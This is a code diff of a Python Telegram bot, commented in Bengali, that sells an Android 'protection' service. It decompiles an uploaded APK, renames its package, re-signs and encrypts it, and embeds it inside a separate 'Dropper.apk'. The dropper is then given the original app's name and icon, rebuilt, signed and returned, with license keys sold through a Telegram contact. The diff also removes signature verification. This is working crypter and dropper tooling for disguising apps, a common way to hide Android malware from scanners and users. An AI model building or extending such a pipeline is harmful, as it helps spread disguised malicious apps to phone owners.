@@ -13,6 +13,7 @@ import string
 import time
 import logging
 import re
+import asyncio
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
@@ -212,50 +213,40 @@ def process_encryption(apk_data: bytes, assets_dir: str):
             f.write(bytes(chunk))
     return meta
 
-# ----- একটি APK-কে সাইন করার ফাংশন (v1–v4) -----
+# ----- সাইন ফাংশন (ভেরিফিকেশন বাদ) -----
 async def sign_apk(apk_path, chat_id, context, keystore_path, password):
     cmd = f"apksigner sign --ks {keystore_path} --ks-pass pass:{password} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {apk_path}"
     proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
     if proc.returncode != 0:
         await context.bot.send_message(chat_id, f"❌ Signing failed:\n{proc.stderr[:500]}")
         return False
-    verify_cmd = f"apksigner verify {apk_path}"
-    verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True, timeout=60)
-    if verify_result.returncode != 0:
-        await context.bot.send_message(chat_id, f"⚠️ Verification failed:\n{verify_result.stderr[:500]}")
-        return False
     return True
 
-# ----- সহায়ক ফাংশন: ধীরে ধীরে মেসেজ পাঠানো -----
-async def send_progress(chat_id, text, context, delay=0.5):
+# ----- মেসেজ পাঠানোর হেল্পার -----
+async def send_progress(chat_id, text, context):
     await context.bot.send_message(chat_id, text)
-    await asyncio.sleep(delay)   # ডেলি যোগ করতে asyncio ইমপোর্ট করতে হবে
+    await asyncio.sleep(0.2)   # মিনিমাম ডেলি
 
-# ----- APK প্রসেসিং (মূল কাজ) -----
-import asyncio   # <-- asyncio import যোগ করুন
-
+# ----- APK প্রসেসিং (দ্রুত, অ্যালাইনমেন্ট সহ) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
 
-    await send_progress(chat_id, "📥 APK received. Processing started.", context)
+    await send_progress(chat_id, "📥 Processing started...", context)
     work_dir = tempfile.mkdtemp()
     try:
-        # ---- ধাপ ১: ইউজারের APK সংরক্ষণ ও ডিকম্পাইল ----
         input_apk = os.path.join(work_dir, 'input.apk')
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
-        await send_progress(chat_id, "✅ APK saved.", context)
 
-        await send_progress(chat_id, "📖 Decoding user APK...", context)
+        # ---- ১. ইউজার APK ডিকম্পাইল ----
         decoded_user = os.path.join(work_dir, 'decoded_user')
-        proc = subprocess.run(f"apktool d -f -o {decoded_user} {input_apk}", shell=True, capture_output=True, text=True, timeout=300)
+        proc = subprocess.run(f"apktool d -f -o {decoded_user} {input_apk}", shell=True, capture_output=True, text=True, timeout=120)
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{proc.stderr[:500]}")
             return
-        await send_progress(chat_id, "✅ User APK decoded.", context)
 
-        # ---- ধাপ ২: ইউজারের APK থেকে নাম ও আইকন বের করা ----
+        # নাম বের করা
         app_name = "App"
         strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
         if os.path.exists(strings_path):
@@ -270,8 +261,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # ---- ধাপ ৩: ইউজারের APK-এর package name পরিবর্তন করা ----
-        await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
+        # প্যাকেজ নাম পরিবর্তন
         manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
             with open(manifest_path, 'r', encoding='utf-8') as f:
@@ -296,16 +286,14 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_path, 'w', encoding='utf-8') as f:
                 f.write(content)
 
-        # ---- ধাপ ৪: ইউজারের পরিবর্তিত APK-কে রিকম্পাইল ও সাইন ----
-        await send_progress(chat_id, "🛠 Rebuilding user APK with new package name...", context)
+        # রিকম্পাইল ইউজার APK
         modified_apk = os.path.join(work_dir, 'modified_user.apk')
-        proc = subprocess.run(f"apktool b -o {modified_apk} {decoded_user}", shell=True, capture_output=True, text=True, timeout=300)
+        proc = subprocess.run(f"apktool b -o {modified_apk} {decoded_user}", shell=True, capture_output=True, text=True, timeout=120)
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed:\n{proc.stderr[:500]}")
             return
-        await send_progress(chat_id, "✅ User APK rebuilt.", context)
 
-        await send_progress(chat_id, "🔑 Signing user APK...", context)
+        # সাইন ইউজার APK
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found!")
@@ -319,33 +307,27 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         if not await sign_apk(modified_apk, chat_id, context, keystore, passwd):
             return
-        await send_progress(chat_id, "✅ User APK signed.", context)
 
-        # ---- ধাপ ৫: সাইন করা ইউজার APK-কে এনক্রিপ্ট করা ----
-        await send_progress(chat_id, "🔐 Encrypting user APK...", context)
+        # এনক্রিপ্ট ইউজার APK
         with open(modified_apk, 'rb') as f:
             modified_apk_data = f.read()
 
-        # ---- ধাপ ৬: Dropper.apk ডিকম্পাইল ----
-        await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
+        # ---- ২. Dropper প্রসেসিং ----
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "❌ Dropper.apk not found!")
             return
         decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
-        proc = subprocess.run(f"apktool d -f -o {decoded_dropper} {dropper_apk}", shell=True, capture_output=True, text=True, timeout=300)
+        proc = subprocess.run(f"apktool d -f -o {decoded_dropper} {dropper_apk}", shell=True, capture_output=True, text=True, timeout=120)
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{proc.stderr[:500]}")
             return
-        await send_progress(chat_id, "✅ Dropper APK decoded.", context)
 
-        # ---- ধাপ ৭: এনক্রিপ্ট করা ডেটা Dropper-এর assets-এ বসানো ----
+        # অ্যাসেট রিপ্লেস
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(modified_apk_data, assets_dir)
-        await send_progress(chat_id, "✅ Assets replaced with encrypted user APK.", context)
 
-        # ---- ধাপ ৮: ইউজারের আইকন ও নাম Dropper-এ কপি ----
-        await send_progress(chat_id, "🎨 Copying user app icon and name...", context)
+        # ইউজারের নাম ও আইকন কপি
         res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(res_user):
@@ -372,7 +354,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # ---- ধাপ ৯: Dropper-এর manifest-এ শুধু label ও icon সেট (package name অপরিবর্তিত) ----
+        # Dropper-এর manifest-এ শুধু label/icon সেট
         manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_dropper):
             with open(manifest_dropper, 'r', encoding='utf-8') as f:
@@ -388,66 +370,54 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_dropper, 'w', encoding='utf-8') as f:
                 f.write(content)
 
-        # ---- ধাপ ১০: Dropper-কে রিকম্পাইল ----
-        await send_progress(chat_id, "🛠 Rebuilding Dropper APK...", context)
+        # রিকম্পাইল Dropper
         output_apk = os.path.join(work_dir, 'output.apk')
-        proc = subprocess.run(f"apktool b -o {output_apk} {decoded_dropper}", shell=True, capture_output=True, text=True, timeout=300)
+        proc = subprocess.run(f"apktool b -o {output_apk} {decoded_dropper}", shell=True, capture_output=True, text=True, timeout=120)
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed:\n{proc.stderr[:500]}")
             return
-        await send_progress(chat_id, "✅ Dropper APK rebuilt.", context)
 
-        # ---- ধাপ ১১: Dropper-কে অ্যালাইন ও সাইন ----
-        await send_progress(chat_id, "📦 Aligning Dropper APK...", context)
-        aligned_apk = os.path.join(work_dir, 'aligned_dropper.apk')
+        # ---- অ্যালাইনমেন্ট (zipalign) ----
+        aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
-            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True, timeout=120)
+            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True, timeout=60)
         except Exception as e:
             await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
             return
-        await send_progress(chat_id, "✅ Dropper APK aligned.", context)
 
-        await send_progress(chat_id, "🔑 Signing Dropper APK...", context)
+        # সাইন Dropper (অ্যালাইনমেন্ট করা ফাইল)
         if not await sign_apk(aligned_apk, chat_id, context, keystore, passwd):
             return
-        await send_progress(chat_id, "✅ Dropper APK signed.", context)
 
         final_apk = aligned_apk
 
-        # ---- ধাপ ১২: ফাইল সাইজ চেক ও ইউজারকে পাঠানো ----
+        # ফাইল সাইজ চেক ও পাঠানো
         file_size = os.path.getsize(final_apk)
         file_size_mb = file_size / (1024 * 1024)
         if file_size_mb > 50:
-            await context.bot.send_message(
-                chat_id,
-                f"⚠️ APK size is {file_size_mb:.1f} MB, which exceeds Telegram's 50 MB limit.\n"
-                "The file may not be delivered. Please use a PC or enable auto-download for large files."
-            )
-        else:
-            await send_progress(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...", context)
+            await context.bot.send_message(chat_id, f"⚠️ APK size {file_size_mb:.1f} MB > 50 MB limit.")
+        await context.bot.send_message(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...")
 
-        # send_document with longer timeout (600 seconds)
         try:
             with open(final_apk, 'rb') as f:
-                await context.bot.send_document(chat_id, f, filename="protected_app.apk", timeout=600)
+                await context.bot.send_document(chat_id, f, filename="protected_app.apk")
             await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")
         except Exception as e:
-            await context.bot.send_message(chat_id, f"❌ Failed to send APK: {str(e)[:200]}")
+            await context.bot.send_message(chat_id, f"❌ Send failed: {str(e)[:200]}")
             logger.error(f"send_document failed: {e}")
 
         shutil.rmtree(work_dir)
         logger.info(f"APK processing complete for user {user_id}")
 
     except subprocess.TimeoutExpired:
-        await context.bot.send_message(chat_id, "❌ Processing timed out. Please try again with a smaller APK.")
-        logger.error("subprocess timeout")
+        await context.bot.send_message(chat_id, "❌ Processing timed out. Try again.")
         shutil.rmtree(work_dir, ignore_errors=True)
     except Exception as e:
         logger.error(f"Error: {e}")
         await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
         shutil.rmtree(work_dir, ignore_errors=True)
 
-# ----- বট কমান্ড (অপরিবর্তিত) -----
+# ----- বট কমান্ড -----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📤 Upload APK (Free Daily)", callback_data='upload')],
@@ -467,7 +437,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
 
-    # গ্রুপ চেক – শুধু একটি বার জানান, ব্লক করবেন না
     try:
         chat_id = "@" + REQUIRED_GROUP.lstrip("@")
         member = await context.bot.get_chat_member(chat_id, user_id)
@@ -485,23 +454,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == 'get_key':
         existing = get_user_key(user_id)
         if existing and validate_key(user_id):
-            await query.edit_message_text("✅ You already have an active license key. You can upload unlimited APKs.")
+            await query.edit_message_text("✅ You already have an active license key.")
             return
         await query.edit_message_text(
-            "🔑 To get a license key, please contact @Red_teem.\n"
-            "Once you receive your key, use the command:\n"
-            "/activate <your_key>\n\n"
-            "After activation, you can upload more than the daily limit."
+            "🔑 Contact @Red_teem for a key.\nUse /activate <key>"
         )
     elif query.data == 'upload':
         if not check_daily_limit(user_id):
             if validate_key(user_id):
-                await query.edit_message_text("📤 You have a valid license. Send your APK file.")
+                await query.edit_message_text("📤 Send your APK file.")
                 return
             else:
                 await query.edit_message_text(
                     "❌ You expire free tral limit try tomorrow.\n"
-                    "To get more usage, contact @Red_teem for a license key."
+                    "Contact @Red_teem for a license key."
                 )
                 return
         await query.edit_message_text("📤 Send your APK file.")
@@ -509,7 +475,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # গ্রুপ চেক
     try:
         chat_id = "@" + REQUIRED_GROUP.lstrip("@")
         member = await context.bot.get_chat_member(chat_id, user_id)
@@ -520,17 +485,15 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_member and not has_been_asked_to_join(user_id):
         await update.message.reply_text(
             f"👋 Welcome! Please consider joining our group: {GROUP_INVITE_LINK}\n"
-            "You can still use the bot without joining, but joining helps us grow."
+            "You can still use the bot without joining."
         )
         mark_asked_to_join(user_id)
 
     if not check_daily_limit(user_id):
-        if validate_key(user_id):
-            pass
-        else:
+        if not validate_key(user_id):
             await update.message.reply_text(
                 "❌ You expire free tral limit try tomorrow.\n"
-                "To get more usage, contact @Red_teem for a license key."
+                "Contact @Red_teem for a license key."
             )
             return
 
@@ -538,7 +501,7 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a valid APK file.")
         return
 
-    await update.message.reply_text("📦 APK received! Starting processing...")
+    await update.message.reply_text("📦 APK received! Processing...")
 
     try:
         file = await update.message.document.get_file()
@@ -552,19 +515,19 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
-        await update.message.reply_text("Usage: /activate <key>\n\nPlease contact @Red_teem to get your key.")
+        await update.message.reply_text("Usage: /activate <key>")
         return
     user_id = update.effective_user.id
     key = args[0]
     if validate_key(user_id, key):
-        await update.message.reply_text("✅ Key activated! You can now upload unlimited APKs.")
+        await update.message.reply_text("✅ Key activated! You can upload unlimited APKs.")
     else:
-        await update.message.reply_text("❌ Invalid key. Please contact @Red_teem to get a valid key.")
+        await update.message.reply_text("❌ Invalid key. Contact @Red_teem.")
 
 # ----- অ্যাডমিন -----
 async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("❌ You are not authorized to use this command.")
+        await update.message.reply_text("❌ Unauthorized.")
         return
     args = context.args
     if not args:
@@ -573,16 +536,15 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target_id = int(args[0])
         key = generate_key(target_id)
-        await update.message.reply_text(f"✅ Key generated for user {target_id}: `{key}`\nProvide this key to the user.")
+        await update.message.reply_text(f"✅ Key for user {target_id}: `{key}`")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Commands:\n"
         "/start - Main menu\n"
-        "/activate <key> - Activate your license key\n"
-        "/genkey <user_id> - (Admin) Generate key for a user\n"
+        "/activate <key> - Activate license\n"
+        "/genkey <user_id> - (Admin) Generate key\n"
         "/help - This help"
     )
 
@@ -599,7 +561,15 @@ def run_bot():
             logger.error("BOT_TOKEN missing! Bot will not start.")
             return
 
-        application = Application.builder().token(BOT_TOKEN).build()
+        # গ্লোবাল টাইমআউট সেট (600 সেকেন্ড)
+        application = (
+            Application.builder()
+            .token(BOT_TOKEN)
+            .read_timeout(600)
+            .write_timeout(600)
+            .connect_timeout(60)
+            .build()
+        )
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("activate", activate))
